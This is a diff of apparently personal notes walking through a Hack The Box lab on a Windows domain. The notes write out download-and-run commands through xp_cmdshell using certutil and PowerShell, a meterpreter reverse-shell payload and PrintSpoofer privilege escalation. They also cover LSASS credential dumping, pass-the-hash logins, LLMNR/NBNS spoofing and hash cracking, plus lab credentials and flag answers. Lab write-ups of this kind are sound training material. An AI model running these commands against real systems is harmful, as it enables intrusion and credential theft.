@@ -223,18 +223,24 @@ The permission "SeImpersonatePrivilege" is enabled. It allows a process to assum
 >
 > The permission is often used by the Print Spooler to abuse special privileges and priv esc a standard user. To execute this attack generate an msfvenom payload and download the [PrintSpoofer](https://github.com/itm4n/printspoofer)
 
-Download the executable and scp to htb-student
+Download the executable and host the exploit
 ```go
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
 ```
 
 ```go
-scp PrintSpoofer32.exe htb-student@10.129.25.29:~/
+python3 -m http.server 8888
+```
+
+
+On the Pivot Target, download the PrintSpoofer32 exploit
+```go
+wget http://10.10.16.3:8888/PrintSpoofer32.exe
 ```
 
 Generate msfvenom payload
 ```go
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=9999 -o payload.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=9999 -o shell.exe
 ```
 
 Start netcat on htb-student
@@ -248,7 +254,7 @@ python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172
 ```
 
 
-On the SQL01 Host, download the files using PowerShell
+On the SQL01 Host, download the files using certutil
 
 Is there a public folder present?
 ```go
@@ -256,20 +262,182 @@ EXEC xp_cmdshell 'dir C:\Public\Users';
 ```
 
 ```go
+EXEC xp_cmdshell 'dir C:\windows\temp';
+```
+
+```go
 EXEC xp_cmdshell 'cd C:\Public\Users && dir';
 ```
 
 ```go
-EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://172.16.7.240:8888/payload.exe -OutFile C:\Users\Public\payload.exe"';
+EXEC xp_cmdshell "certutil -urlcache -split -f http://172.16.7.240:8888/shell.exe C:\windows\temp\shell.exe";
 ```
 
 ```go
-EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri ''http://172.16.7.240:8888/PrintSpoofer64.exe'' -OutFile ''C:\Users\Public\PrintSpoofer64.exe''"';
+EXEC xp_cmdshell "certutil -urlcache -split -f http://172.16.7.240:8888/PrintSpoofer64.exe C:\windows\temp\PrintSpoofer64.exe;"
 ```
+
+
+```go
+EXEC xp_cmdshell 'powershell -Command "(New-Object System.Net.WebClient).DownloadFile(''http://172.16.7.240:8888/shell.exe'',''C:\windows\temp\shell.exe'')"';
+```
+
+```go
+EXEC xp_cmdshell 'powershell -Command "(New-Object System.Net.WebClient).DownloadFile(''http://172.16.7.240:8888/PrintSpoofer64.exe'',''C:\windows\temp\PrintSpoofer64.exe'')"';
+```
+
+```go
+EXEC xp_cmdshell 'powershell wget "http://172.16.7.240:8888/PrintSpoofer64.exe" -OutFile c:\windows\temp\\PrintSpoofer64.exe';
+```
+
 
 Execute
 ```go
-EXEC xp_cmdshell 'C:\Public\Users\PrinterSpoofer64.exe -c C:\Public\Users\payload.exe' 
+EXEC xp_cmdshell "C:\windows\temp\PrintSpoofer64.exe -c C:\windows\temp\shell.exe"
 ```
 
-![[Pasted image 20260610175450.png]]
+Get the flag
+```go
+more C:\Users\administrator\Desktop\flag.txt
+```
+
+flag
+```go
+s3imp3rs0nate_cl@ssic
+```
+
+#### Question 8: Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
+
+>[!Important] Dan, remember to do a quick "progress review check!"
+>- Do any of the previous exploits assist with the current assignment?
+>- Did I add discovered users to the "User Creds" note?
+>- Who has access to what?
+>- What hosts have been compromised?
+>- Which users have elevated privileges?
+
+The previous challenge gave me system privileges on SQL01, I will need this to dump the LSASS secrets. With the meterpeter session still open, use kiwi to extract the administrator's hash
+
+```go
+load kiwi
+```
+
+```go
+lsa_dump_creds
+```
+
+![[Pasted image 20260612151328.png]]
+
+Using the admin's hash, RDP into MS01
+```go
+evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+```
+
+```go
+more C:\Users\administrator\Desktop\flag.txt
+```
+
+Answer:
+```go
+exc3ss1ve_adm1n_r1ights!
+```
+
+#### Question 9: Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
+
+Log into the SQL01 host with the admins hash
+```go
+evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+```
+
+
+```go
+Invoke-WebRequest -Uri "http://172.16.7.240:8888/PowerView.ps1" -OutFile "C:\Users\Administrator\Documents\PowerView.ps1"
+```
+
+>[!Note]
+>Import PowerView and convert the Domain Admin's group name to a sid
+
+On the pivot host...copy the the script to your current directory
+```go
+cp /usr/lib/python3/dist-packages/cme/data/powersploit/Recon/PowerView.ps1
+```
+
+```go
+python3 -m http.server 8888
+```
+
+On SQL01, download the PowerView.ps1 file
+```go
+Invoke-WebRequest -Uri "http://172.16.7.240:8888/PowerView.ps1" -OutFile "C:\Users\Administrator\Documents\PowerView.ps1"
+```
+
+Importing PowerView
+```go
+Import-Module .\PowerView.ps1
+```
+
+Convert name to SID
+```go
+Convert-NameToSid "Domain Admins"
+```
+
+This gives me...
+```go
+S-1-5-21-3327542485-274640656-2609762496-512
+```
+
+```go
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $dagroupsid}
+```
+
+```go
+Get-DomainObjectACL -Identity "S-1-5-21-3327542485-274640656-2609762496-512" -ResolveGUID
+```
+
+```go
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $dagroupsid} -Verbose
+```
+
+>[!Error] NONE OF THIS WORKED. USE INVEIGH INSTEAD!
+> I had to download from their GitHub and scp to the pivot host
+> ```go
+> scp Inveigh.ps1 htb-student@10.129.27.32:/home/htb-student/Desktop
+> ```
+
+Host the file and grab from SQL01
+```go
+Invoke-WebRequest -Uri "http://172.16.7.240:8888/Inveigh.ps1" -OutFile "C:\Users\Administrator\Documents\Inveigh.ps1"
+```
+
+Import Inveigh.ps1
+```go
+Import-Module .\Inveigh.ps1
+```
+
+Start Inveigh with LLMNR and NBNS spoofing, output to console and write to a file
+```go
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+
+
+#### Question 10: Crack this user's password hash and submit the cleartext password as your answer.
+
+Hash
+```go
+CT059::INLANEFREIGHT:1A6F56F2F779AA0C:4938D77DE286AB6CD823A7AF6C567DBC:0101000000000000ABBACDF7B4FADC013CEF5B7ED85B38130000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800ABBACDF7B4FADC010600040002000000080030003000000000000000000000000020000044D8CEF6EEFEDEE580E4972F8E575D1C23C915CE637B11E1FA600787CBE852640A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
+```
+
+Hash type is NetNTLMv2
+```
+hashid ct059-hash
+```
+
+Crack the hash
+```go
+hashcat -m 5600 ct059-hash /usr/share/wordlists/rockyou.txt
+```
+
+Answer:
+```go
+charlie1
+```
